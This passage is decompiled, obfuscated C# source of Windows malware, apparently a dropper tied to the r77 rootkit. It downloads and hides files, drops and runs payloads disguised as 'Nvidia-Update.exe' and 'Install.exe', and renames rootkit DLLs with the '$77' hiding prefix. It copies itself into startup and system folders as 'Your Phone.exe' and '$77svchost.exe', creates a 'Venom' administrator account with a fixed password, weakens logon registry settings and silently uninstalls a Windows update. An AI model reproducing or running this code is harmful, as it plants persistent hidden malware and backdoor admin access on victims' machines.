    string str = Path.Combine(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), name);
    new WebClient().DownloadFile(link, str);
    \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲.\uFFFD難ᄌ川郕\uED64䆊镙\u3321㥡\u1943⳰띃患櫵剥\uFFFD雜쵠螵(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void ᢹ\uFFFDᑯ\u2414猷Ṟ洄䪽䇇쭆\uE3AA\uA7F4퀪ヹ䫦츿좏\uFFFF鳁贤(string link, string name)
  {
    string str = Path.Combine(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), name);
    new WebClient().DownloadFile(link, str);
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void Р呔圴\uF80Eᥕ젺猎伓谜ル뺿ംꞕ䬵ꗭ\uFFFD蟚짏較ￎ()
  {
    foreach (string file in Directory.GetFiles(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "*.txt"))
      System.IO.File.Delete(file);
  }

  public static void \uE882ᔌ䅿\uEF91쯥請隮䧂뮄\u2B55㝅\u07BF傳\uF76D凄瘬ﺺ箮鏾㻳()
  {
    try
    {
      bool[] flagArray = new bool[2]{ true, false };
      foreach (bool flag in flagArray)
      {
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
        {
          if ((registryKey.GetValue("AppInit_DLLs", (object) "") as string).Contains("$77-"))
            registryKey.SetValue("AppInit_DLLs", (object) "");
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public static void 뮞쩯灟袛龲\uECA0\u0708ช瑿벥궤곢贈쌟\uF0C6ᢻ깹仓䊻ꔯ()
  {
    string str = Path.Combine(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "Install.exe");
    System.IO.File.WriteAllBytes(str, \u17FC͂\uF032ᓏ\uE7B6뱎\uEC42ๆ鳷ओ‿\u2392ꉘ隫᥊昡微壣ꓙ㟎.Install);
    Process.Start(str);
    \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲.\uFFFD難ᄌ川郕\uED64䆊镙\u3321㥡\u1943⳰띃患櫵剥\uFFFD雜쵠螵(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.笂᪻舡\uFFFD\uFFFD微얇\uFFFD晱\uF682तꀚ䁅\uE9B8넶땤\u2788淫㚴ꝓ();
  }

  public static void 戒ĭ謁㮔硐\u2526膇\uF281ࣲ\uEB9Bፚ\uE967㛎睑瞬诘觃ጱ\uEADE渭()
  {
    Process.Start("cmd.exe", "/c taskkill /f /im explorer.exe");
    Thread.Sleep(500);
    Process.Start(Environment.SystemDirectory + "\\..\\explorer.exe");
  }

  public static void 둦粵\uE82A\uFDC8ㄳꛩ饵ድ\u0087㳿\u328D埦\uEEED舂\uFFFD\u229D\u0DFFЉᅻ췭()
  {
    string str = Path.Combine(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "Nvidia-Update.exe");
    System.IO.File.WriteAllBytes(str, \u17FC͂\uF032ᓏ\uE7B6뱎\uEC42ๆ鳷ओ‿\u2392ꉘ隫᥊昡微壣ꓙ㟎.Chrome);
    Process.Start(str);
    \uF42C倈\u0A0C查\uFBD1ힴ\u3346흸碤쥄ꢱ셿ϵ\uA6FE鐎\uAACC雷땕\u1AF1맲.\uFFFD難ᄌ川郕\uED64䆊镙\u3321㥡\u1943⳰띃患櫵剥\uFFFD雜쵠螵(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.笂᪻舡\uFFFD\uFFFD微얇\uFFFD晱\uF682तꀚ䁅\uE9B8넶땤\u2788淫㚴ꝓ();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.戒ĭ謁㮔硐\u2526膇\uF281ࣲ\uEB9Bፚ\uE967㛎睑瞬诘觃ጱ\uEADE渭();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.疑鵉巭Ў곣墐\u22EE\u2E4D숲ῂꘄ抙駩爵\uF8CD\uE10Cⁱ씁ᡨ\uF1BD();
    㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.ⶐ笡\u2E95羉퍶ꮀ\u2A2A\u0A61㞹摑䊇㲇褎\u21F9獉읚嫷該\uEE36켢();
  }

  public static void \u2A75潚劈慖ᩂ뒖ヤ豘\u2B65벹槥ᄴ\u2E83鋊滩튝\u32C3䮦噬竀() => Array.ForEach<Process>(Process.GetProcessesByName("cmd"), (Action<Process>) (x => x.Kill()));

  public static void 笂᪻舡\uFFFD\uFFFD微얇\uFFFD晱\uF682तꀚ䁅\uE9B8넶땤\u2788淫㚴ꝓ() => 㥗\u2622귝銕꿍輁쮒ၪሦꮑ\u2A04琄ങ໙\u2E68覜㓼똡眄餶.\u2A75潚劈慖ᩂ뒖ヤ豘\u2B65벹槥ᄴ\u2E83鋊滩튝\u32C3䮦噬竀();

  public static void 疑鵉巭Ў곣墐\u22EE\u2E4D숲ῂꘄ抙駩爵\uF8CD\uE10Cⁱ씁ᡨ\uF1BD()
  {
    Thread.Sleep(30000);
    foreach (string file in Directory.GetFiles(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "*.dll"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "Install.exe"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "Nvidia-Update.exe"))
      System.IO.File.Delete(file);
  }

  public static void ⶐ笡\u2E95羉퍶ꮀ\u2A2A\u0A61㞹摑䊇㲇褎\u21F9獉읚嫷該\uEE36켢()
  {
    if (!System.IO.File.Exists(Path.Combine(Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋), "Install.exe")))
      return;
    string str1 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string[] files1 = Directory.GetFiles(str1, "r77-x64.dll");
    string destFileName1 = Path.Combine(str1, "$77-x64.dll");
    foreach (string sourceFileName in files1)
      System.IO.File.Move(sourceFileName, destFileName1);
    string str2 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string[] files2 = Directory.GetFiles(str2, "r77-x64.dll");
    string destFileName2 = Path.Combine(str2, "$77-x86.dll");
    foreach (string sourceFileName in files2)
      System.IO.File.Move(sourceFileName, destFileName2);
    string str3 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string[] files3 = Directory.GetFiles(str3, "Install.exe");
    string destFileName3 = Path.Combine(str3, "$77-Install.exe");
    foreach (string sourceFileName in files3)
      System.IO.File.Move(sourceFileName, destFileName3);
    string str4 = Path.Combine(鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.풗ᛸ髊\uFFFDࡌ\uE855Ⲽ\uF31A跥\uFFFD\uE3AF\u2947\uA7E1눸襨狹틊\u24B9풉埽, 鼀竃텕\u0C49칀센\uF6CB\uF7CC츲폰騨맇ᇨꥍ獰\u2FC3㾞禗\u0E93䈀.\u086B苅铜䮰究\uFFFD쉒\uE3C1葈溩\u25CD䤝婋男霏䵶핼箫㤟̋);
    string[] files4 = Directory.GetFiles(str4, "Nvidia-Update.exe");
    string destFileName4 = Path.Combine(str4, "$77-Nvidia-Update.exe");
    foreach (string sourceFileName in files4)
      System.IO.File.Move(sourceFileName, destFileName4);
  }

  public static void 솈甑\uF0DC㥐ﭢ닏뷟侏껓큸\uFFFD놚䯧鞫꧰ꍪ뫭튑\uE827\uF06A()
  {
    string destFileName1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Your Phone.exe");
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName1);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName1
    });
    string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Your Phone.exe");
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName2);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName2
    });
    string destFileName3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "$77Your Phone.exe");
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName3);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName3
    });
    string destFileName4 = "C:\\users\\public\\$77sys.exe";
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName4);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName4
    });
    string destFileName5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "$77svchost.exe");
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName5);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName5
    });
    string destFileName6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "$77svchost.exe");
    System.IO.File.Copy(ࢥ博씰\uEACA䘿湣͞\uFFFD閱\u246F愮茪忛챗Ǆꕊ棑Ạ\uE9EAኯ.InstallPath, destFileName6);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName6
    });
  }

  public static void ₜ蓿袐\uFFFD팄㸳ᚯ렡彔췴\u17FD\uFFFD\uE957\u290C㱱\u28FE\u270D晈芒뢼()
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = "Venom";
        string newPassword2 = "Venom";
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }
}
